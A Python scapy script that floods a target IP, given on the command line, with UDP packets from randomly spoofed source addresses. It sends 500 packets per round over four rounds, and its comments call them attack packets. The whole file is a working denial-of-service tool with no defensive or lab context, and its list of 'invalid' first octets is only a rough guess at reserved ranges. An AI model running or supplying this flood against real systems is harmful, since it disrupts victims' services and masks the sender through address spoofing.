import sys
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from os import popen
from scapy.all import sendp, IP, UDP, Ether, TCP
from random import randrange

# Generates random source ip addresses
def sourceIPgen():

    # These values are not valid for first octet of IP address
    invalid = [1,2,10,127,169,172,192,254]

    first = randrange(1,256)

    # This ensures the first value is a valid value
    while first in invalid:
        first = randrange(1,256)
        print(first)
    
    # Generating the other octets 
    second = randrange(1,256)
    third = randrange(1,256)
    fourth = randrange(1,256)
    
    # This joins together the ip address
    ip = ".".join([str(first),str(second),str(third),str(fourth)])
    
    return ip


def main():
    for i in range(1,5):
        mymain()
        time.sleep(10)
     
        
# Send the generated IPs 
def mymain():

    # Getting the ip address to send attack packets 
    dstIP = sys.argv[1:]
    print(dstIP)
    src_port = 80
    dst_port = 1

    # This is to open the interface on the device to send out the packets
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

    # Packet generation
    for i in range(0,500):   
        packets = Ether()/IP(dst=dstIP,src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)
        print(repr(packets))

        # Send packet every 0.005s 
        sendp(packets,iface=interface.rstrip(),inter=0.005)


# Main
if __name__=="__main__":
  main()